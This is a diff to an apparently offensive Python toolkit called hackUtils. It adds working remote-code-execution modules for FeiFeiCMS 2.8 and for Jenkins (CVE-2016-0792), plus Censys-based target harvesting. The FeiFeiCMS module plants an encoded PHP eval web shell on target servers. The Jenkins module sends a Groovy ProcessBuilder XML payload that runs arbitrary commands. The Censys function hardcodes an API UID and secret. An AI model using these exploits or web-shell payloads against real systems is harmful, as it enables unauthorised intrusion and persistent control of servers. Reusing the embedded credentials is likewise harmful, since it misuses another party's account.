@@ -474,9 +474,9 @@ def getInfoByJoomlaRCE(result, param):
     if "System" in param:
         reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
     elif "DOCUMENT_ROOT" in param:	
-        reg = '.*<tr><td class="e">DOCUMENT_ROOT </td><td class="v">([^<>]*?)</td></tr>.*'
+        reg = '.*<tr><td class="e">_SERVER\["DOCUMENT_ROOT"\]</td><td class="v">([^<>]*?)</td></tr>.*'
     elif "SCRIPT_FILENAME" in param:
-        reg = '.*<tr><td class="e">SCRIPT_FILENAME </td><td class="v">([^<>]*?)</td></tr>.*'
+        reg = '.*<tr><td class="e">_SERVER\["SCRIPT_FILENAME"\]</td><td class="v">([^<>]*?)</td></tr>.*'
     match_url = re.search(reg,result)
     if match_url:
        info=match_url.group(1)
@@ -500,10 +500,243 @@ def getShellByJoomlaRCE(url, system, script_filename):
             return "no info!"
     else:
         return "no info!"
+
+def rceFeiFeiCMS(value):
+    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
+    print "["+str(now)+"] [INFO] Checking FeiFeiCMS 2.8 Remote Code Execution..."
+    if 'http://' in value or 'https://' in value:
+    	url=value
+    	checkFeiFeiCMS(url)
+    else:
+    	urlfile=open(value,'r')
+    	for url in urlfile:
+            if url.strip():
+                checkFeiFeiCMS(url)
+    	urlfile.close()
+    output = os.path.dirname(os.path.realpath(__file__))+"/feifeicms_rce.txt"
+    if os.path.exists(output):
+        print "\n[INFO] Scanned Vuls:"
+        print "[*] Output File: "+output
+
+def checkFeiFeiCMS(url):    
+    url = url.strip()
+    reg = 'http[s]*://.*/$'
+    m = re.match(reg,url)
+    if not m:
+        url = url + "/"
+    logfilename=str(time.strftime('%y_%m_%d',time.localtime(time.time())))+".log.html"
+    poc_1 = url+"index.php?s=my-show-id-1{~phpinfo()}.html"
+    poc_2 = url+"index.php?s=my-show-id-\\..\\Runtime\\Logs\\"+logfilename
+    try:
+        result = exploitFeiFeiCMS(poc_1,poc_2)
+        if 'phpinfo()' in result:
+            system = getInfoByFeiFeiCMS(result, 'System')
+            document_root = getInfoByFeiFeiCMS(result, 'DOCUMENT_ROOT')
+            script_filename = getInfoByFeiFeiCMS(result, 'SCRIPT_FILENAME')
+            shell_file = getShellByFeiFeiCMS(url)
+            vuls='[+] vuls found! url: '+url+', System: '+system+', document_root: '+document_root+', script_filename: '+script_filename+', shell_file: '+shell_file
+            logfile(vuls,'feifeicms_rce.txt')
+            print vuls
+        else:
+            print '[!] no vuls! url: '+url
+    except Exception,e:
+        print '[!] connection failed! url: '+url
+
+def exploitFeiFeiCMS(p1, p2):
+    requests.get(p1, timeout=10)
+    response = requests.get(p2, timeout=10) 
+    return response.content
+
+def getInfoByFeiFeiCMS(result, param):
+    if "System" in param:
+        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
+    elif "DOCUMENT_ROOT" in param:
+        reg = '.*<tr><td class="e">_SERVER\["DOCUMENT_ROOT"\]</td><td class="v">([^<>]*?)</td></tr>.*'
+    elif "SCRIPT_FILENAME" in param:
+        reg = '.*<tr><td class="e">_SERVER\["SCRIPT_FILENAME"\]</td><td class="v">([^<>]*?)</td></tr>.*'
+    match_url = re.search(reg,result)
+    if match_url:
+       info=match_url.group(1)
+    else:
+        info = 'no info!'
+    return info
+
+def getShellByFeiFeiCMS(url):
+    logfilename=str(time.strftime('%y_%m_%d',time.localtime(time.time())))+".log.html"
+    #cmd ="file_put_contents('1ndex.php',base64_decode(base64_decode('UEQ5d2FIQWdhV1lvSVNSZlVFOVRWRnNuYUdGdVpHeGxKMTBwZTJobFlXUmxjaWduU0ZSVVVDOHhMakVnTkRBMElFNXZkQ0JHYjNWdVpDY3BPeUJsZUdsMEtDazdJSDFsYkhObGV5QWtjejBpY0NJdUluSWlMaUpsSWk0aVp5SXVJbDhpTGlKeUlpNGlaU0l1SW5BaUxpSnNJaTRpWVNJdUltTWlMaUpsSWpzZ0pITW9JbjViWkdselkzVjZYWDVsSWl3a1gxQlBVMVJiSjJoaGJtUnNaU2RkTENKQlkyTmxjM01pS1RzZ2ZTQS9QZz09')))"  #password: handle
+    #cmd = "file_put_contents('wooyun.txt','wooyun')"
+    shell = 'h.php'
+    cmd ="file_put_contents('"+shell+"',base64_decode(base64_decode('UEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VV3ljeEoxMHBPejgr')))" #password: 1
+    payload_l = url+"index.php?s=my-show-id-1{~"+str(cmd)+"}.html"
+    payload_2 = url+"index.php?s=my-show-id-\\..\\Runtime\\Logs\\"+logfilename
+    try:
+        exploitFeiFeiCMS(payload_l, payload_2)
+        return url+shell
+    except Exception, e:
+        return "no info!"
+
+def fetchCensys(value,field,page):
+    API_URL = "https://www.censys.io/api/v1"
+    UID = "3ac350c3-21f9-46be-aeb7-d18f832006f9"  #Your API UID
+    SECRET = "UBqUKkuUevh2pZqfO3fQalqNVDheGWuc"   #Your API SECRET
+    value = value.strip()
+    field = field.strip()
+    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
+    print "["+str(now)+"] [INFO] Fetching IPs/URLs from Censys..."
+    for i in range(1,page):
+        data = {                                           
+             "query":value, 
+             "page":int(i), 
+             "fields":[field]
+            }
+	if field == "ip":
+	   res = requests.post(API_URL + "/search/ipv4", data=json.dumps(data), auth=(UID, SECRET)).text
+	elif field == "domain":
+	   res = requests.post(API_URL + "/search/websites", data=json.dumps(data), auth=(UID, SECRET)).text
+        try:
+            results = json.loads(res)
+            for result in results["results"]:
+                censys=result[field]
+                mynow = time.strftime('%H:%M:%S',time.localtime(time.time()))
+		if field == "domain":
+		   censys = "http://"+censys
+                logfile(censys,'censys.txt')
+                print "["+str(mynow)+"] [INFO] "+censys
+        except Exception:
+            mynow = time.strftime('%H:%M:%S',time.localtime(time.time()))
+            print "["+str(mynow)+"] [WARNING] nothing found, please check API UID and SECRET!"
+    output = os.path.dirname(os.path.realpath(__file__))+"/censys.txt"
+    if os.path.exists(output):
+        print "\n[INFO] Fetched IPs/URLs:"
+        print "[*] Output File: "+output
+
+def rceXStreamJenkins(value):
+    value_ip = value.strip().split("::")[0]
+    if len(value.strip().split("::"))>1:
+        value_cmdstr = value.strip().split("::")[1]
+    else:
+        value_cmdstr = ""
+    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
+    print "["+str(now)+"] [INFO] Checking XStream (Jenkins CVE-2016-0792) Remote Code Execution..."
+    if os.path.exists(value_ip.strip()):
+        ipfile=open(value_ip,'r')
+    	for ip in ipfile:
+            if ip.strip():
+                checkXStreamJenkins(ip, value_cmdstr)
+    	ipfile.close()
+    else:
+        checkXStreamJenkins(value_ip, value_cmdstr)
+    output = os.path.dirname(os.path.realpath(__file__))+"/jenkins.txt"
+    if os.path.exists(output):
+        print "\n[INFO] Scanned Vuls:"
+        print "[*] Output File: "+output
+
+def checkXStreamJenkins(ip, cmdstr):
+    ip = ip.strip()
+    url = getURLFromJenkins(ip)
+    if url:
+        try:
+            result = requests.get(url,timeout=10).content
+            job = getJobFromJenkins(result)
+            ver = getJenkinsVersion(result)
+            if job:
+                #job_url = url + job + "config.xml"
+                job_url = url + "createItem?name=hackUtils"
+                exploitXStreamJenkins(job_url, cmdstr, ver)
+            else:
+                print '[!] no job found! url: '+url
+        except Exception,e:
+            print '[!] connection failed! url: '+url
+    else:
+        print '[!] connection failed! ip: '+ip
+
+def exploitXStreamJenkins(job_url, cmdstr, ver):  
+    command = ""
+    if cmdstr == "":
+        command = "<string>dir</string>"
+    else:
+        cmd = cmdstr.split(" ")
+        for str in cmd:
+            command += "<string>" + str + "</string>" 
+    payload = "<map><entry><groovy.util.Expando><expandoProperties><entry><string>hashCode</string><org.codehaus.groovy.runtime.MethodClosure><delegate class=\"groovy.util.Expando\" reference=\"../../../..\"/><owner class=\"java.lang.ProcessBuilder\"><command>"+command+"</command><redirectErrorStream>false</redirectErrorStream></owner><resolveStrategy>0</resolveStrategy><directive>0</directive><parameterTypes/><maximumNumberOfParameters>0</maximumNumberOfParameters><method>start</method></org.codehaus.groovy.runtime.MethodClosure></entry></expandoProperties></groovy.util.Expando><int>1</int></entry></map>"
+
+    try:
+    	headers = {'content-type': 'application/xml'}
+        res = requests.post(job_url,timeout=10,data=payload,headers=headers)
+        if res.status_code == 500:
+            html = res.content
+            if html:
+                reg = '.*java.io.IOException: Unable to read([^<>]*?)at hudson\.XmlFile\.*'
+                match = re.search(reg,html)
+                if match:
+                   job_path=match.group(1).strip()
+                   if ":" in job_path:
+                       system = "Windows"
+                   else:
+                       system = "Linux/Unix"
+                   vul= "[+] vuls found! url: "+job_url+", system: "+system+", version: "+ver+", job_path: "+job_path
+                   logfile(vul,'jenkins.txt')
+                   print vul
+                else:
+                    print '[!] exploit failed! job_url: '+job_url
+            else:
+                print '[!] exploit failed! job_url: '+job_url
+        else:
+            print '[!] exploit failed! job_url: '+job_url
+    except Exception:
+        print '[!] exploit failed! job_url: '+job_url
+
+def getURLFromJenkins(ip):
+    url1 = "http://"+ip+"/jenkins/"
+    url2 = "http://"+ip+":8080/jenkins/"
+    url3 = "http://"+ip+":8080/"
+    url4 = "http://"+ip+"/"
+    if returnCodeFromURL(url1) == 200:
+        return url1
+    elif returnCodeFromURL(url2) == 200:
+        return url2
+    elif returnCodeFromURL(url3) == 200:
+        return url3
+    elif returnCodeFromURL(url4) == 200:
+        return url4
+    else:
+        return ""
+
+def returnCodeFromURL(url):
+    try:
+        res = requests.get(url,timeout=10).status_code
+        return res
+    except Exception:
+        return ""
+
+def getJobFromJenkins(html):
+    try:
+        soup = BeautifulSoup(html)
+        html=soup.find('div', class_="dashboard")
+        html_doc=html.find('table', id="projectstatus")
+	href=html_doc.find_all('a', class_="model-link inside")[0].get('href')
+        if href:
+            return href
+        else:
+            return ""
+    except Exception:
+        return ""
+
+def getJenkinsVersion(html):
+    try:
+        soup = BeautifulSoup(html)
+        html_doc=soup.find('span', class_="jenkins_ver")
+	ver=html_doc.find('a').find_all(text=True)[0]
+        if ver:
+            return str(ver)
+        else:
+            return ""
+    except Exception:
+        return ""
     
 def myhelp():
     print "\n+-----------------------------+"
-    print "|  hackUtils v0.0.3           |"
+    print "|  hackUtils v0.0.8           |"
     print "|  Avfisher - avfisher.win    |"
     print "|  security_alert@126.com     |"
     print "+-----------------------------+\n"
@@ -512,26 +745,38 @@ def myhelp():
     print "  -h, --help                                          Show basic help message and exit"
     print "  -b keyword, --baidu=keyword                         Fetch URLs from Baidu based on specific keyword"
     print "  -g keyword, --google=keyword                        Fetch URLs from Google based on specific keyword"
+    print "  -i keyword, --censysip=keyword                      Fetch IPs from Censys based on specific keyword"
+    print "  -u keyword, --censysurl=keyword                     Fetch URLs from Censys based on specific keyword"
     print "  -w keyword, --wooyun=keyword                        Fetch URLs from Wooyun Corps based on specific keyword"
     print "  -j url|file, --joomla=url|file                      Exploit SQLi for Joomla 3.2 - 3.4"
     print "  -r url|file, --rce=url|file                         Exploit Remote Code Execution for Joomla 1.5 - 3.4.5 (Password: handle)"
+    print "  -f url|file, --ffcms=url|file                       Exploit Remote Code Execution for FeiFeiCMS 2.8 (Password: 1)"
+    print "  -k ip|file[::cmd], --jenkins=ip|file[::cmd]         Exploit Remote Code Execution for XStream (Jenkins CVE-2016-0792)"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
     print "\nExamples:"
     print "  hackUtils.py -b inurl:www.example.com"
     print "  hackUtils.py -g inurl:www.example.com"
+    print "  hackUtils.py -i 1099.java-rmi"
+    print "  hackUtils.py -u 1099.java-rmi"
     print "  hackUtils.py -w .php?id="
     print "  hackUtils.py -j http://www.joomla.com/"
     print "  hackUtils.py -j urls.txt"
     print "  hackUtils.py -r http://www.joomla.com/"
     print "  hackUtils.py -r urls.txt"
+    print "  hackUtils.py -f http://www.feifeicms.com/"
+    print "  hackUtils.py -f urls.txt"
+    print "  hackUtils.py -k 10.10.10.10"
+    print "  hackUtils.py -k 10.10.10.10::dir"
+    print "  hackUtils.py -k ips.txt"
+    print "  hackUtils.py -k ips.txt::\"touch /tmp/jenkins\""
     print "  hackUtils.py -d example.com"
     print "  hackUtils.py -e text"
     print "\n[!] to see help message of options run with '-h'"
 
 def main():
     try:
-        options,args = getopt.getopt(sys.argv[1:],"hb:g:w:j:r:d:e:",["help","baidu=","google=","wooyun=","joomla=","rce=","domain=","encrypt="])
+        options,args = getopt.getopt(sys.argv[1:],"hb:g:i:u:w:j:r:f:k:d:e:",["help","baidu=","google=","censysid=","censysurl=","wooyun=","joomla=","rce=","ffcms=","jenkins=","domain=","encrypt="])
     except getopt.GetoptError:
         print "\n[WARNING] error, to see help message of options run with '-h'"
         sys.exit()
@@ -543,12 +788,20 @@ def main():
             fetchUrls('baidu',value,50)
         if name in ("-g","--google"):
             fetchUrls('google',value,50)
+        if name in ("-i","--censysip"):
+            fetchCensys(value,"ip",50)
+        if name in ("-u","--censysurl"):
+            fetchCensys(value,"domain",50)
         if name in ("-w","--wooyun"):
             fetchUrls('wooyun',value,50)
         if name in ("-j","--joomla"):
             checkJoomla(value)
         if name in ("-r","--rce"):
             rceJoomla(value)
+        if name in ("-f","--ffcms"):
+            rceFeiFeiCMS(value)
+        if name in ("-k","--jenkins"):
+            rceXStreamJenkins(value)
         if name in ("-d","--domain"):
             scanSubDomains('baidu',value,50)
         if name in ("-e","--encrypt"):
